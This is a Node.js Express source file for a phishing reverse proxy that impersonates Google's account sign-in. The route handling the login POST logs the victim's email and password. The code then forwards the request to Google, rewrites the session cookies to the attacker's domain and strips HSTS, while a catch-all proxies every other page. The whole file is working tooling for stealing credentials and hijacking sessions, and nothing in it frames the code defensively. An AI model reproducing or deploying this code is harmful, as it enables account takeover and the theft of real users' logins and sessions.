const express = require('express');
const http = require('http');
const { fetch } = require('undici');
const cookieParser = require('cookie-parser');
const httpProxy = require('http-proxy');

const app = express();

// Middleware
app.use(cookieParser({ decode: (val) => val }));
app.use(express.urlencoded({ extended: true, limit: '50kb' }));
app.use(express.json({ limit: '50kb' }));

// Helper to rewrite cookies
function rewriteCookies(cookies, localDomain) {
  if (!cookies) return [];
  const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
  return cookieArray.map(cookie => {
    if (/domain=/i.test(cookie)) {
      return cookie.replace(/domain=[^;]+/i, `Domain=${localDomain}`);
    } else {
      return `${cookie}; Domain=${localDomain}`;
    }
  });
}

// 1. Intercept the login POST
app.post('/service/lp/challenge', async (req, res) => {
  const username = req.body.email || req.body.emailOrPhone || 'unknown';
  const password = req.body.passwd || 'unknown';
  
  console.log(`[PHISH] Captured: ${username} : ${password}`);

  try {
    let bodyString;
    if (typeof req.body === 'string') {
      bodyString = req.body;
    } else if (req.body && typeof req.body === 'object') {
      bodyString = new URLSearchParams(req.body).toString();
    } else {
      bodyString = '';
    }

    // Request goes out from YOUR IP (Kali or Vercel)
    const response = await fetch('https://accounts.google.com/service/lp/challenge', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Cookie': req.headers.cookie || '',
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
        'Origin': 'https://accounts.google.com',
        'Referer': 'https://accounts.google.com/service/lp/challenge'
      },
      body: bodyString
    });

    const data = await response.text();
    const hostHeader = req.headers['host'] || 'localhost';
    const yourDomain = hostHeader.split(':')[0];

    let setCookieHeaders;
    if (typeof response.headers.getSetCookie === 'function') {
      setCookieHeaders = response.headers.getSetCookie();
    } else {
      setCookieHeaders = response.headers.get('set-cookie');
    }

    if (setCookieHeaders && setCookieHeaders.length > 0) {
      res.setHeader('Set-Cookie', rewriteCookies(setCookieHeaders, yourDomain));
    }

    const contentType = response.headers.get('content-type');
    if (contentType) res.setHeader('Content-Type', contentType);

    res.status(response.status);
    res.send(data);

    // Log the outcome
    try {
      const googleResponse = JSON.parse(data);
      if (googleResponse.error) {
        console.log(`[PHISH] STATUS: FAILED (Google Error: ${googleResponse.error})`);
      } else {
        console.log(`[PHISH] STATUS: SUCCESS`);
      }
    } catch (e) {
      if (data.includes('Invalid login')) {
        console.log(`[PHISH] STATUS: FAILED (HTML: Invalid Login)`);
      } else {
        console.log(`[PHISH] STATUS: SUCCESS (Non-JSON Response)`);
      }
    }

  } catch (error) {
    console.error(`[PHISH] ERROR: ${error.message}`);
    if (!res.headersSent) {
      res.status(500).send('Proxy Error');
    }
  }
});

// 2. Proxy all other requests
const proxy = httpProxy.createProxyServer({
  target: 'https://accounts.google.com',
  secure: false,
  changeOrigin: true,
  logLevel: 'silent'
});

proxy.on('error', (err, req, res) => {
  console.error(`Proxy Error: ${err.message}`);
  if (!res.headersSent) {
    res.writeHead(502, { 'Content-Type': 'text/plain' });
    res.end('Bad Gateway');
  }
});

proxy.on('proxyRes', (proxyRes, req, res) => {
  const hostHeader = req.headers['host'] || 'localhost';
  const yourDomain = hostHeader.split(':')[0];
  const setCookieHeaders = proxyRes.headers['set-cookie'];
  if (setCookieHeaders) {
    const rewrittenCookies = rewriteCookies(setCookieHeaders, yourDomain);
    proxyRes.headers['set-cookie'] = rewrittenCookies;
  }
  delete proxyRes.headers['strict-transport-security'];
});

// Catch-all middleware (Works in Express 4 and 5)
app.use((req, res) => {
  proxy.web(req, res, {
    target: 'https://accounts.google.com',
    path: req.originalUrl
  });
});
const server = http.createServer(app);
server.listen(3000, () => console.log('Phishing Proxy running on http://localhost:3000'));

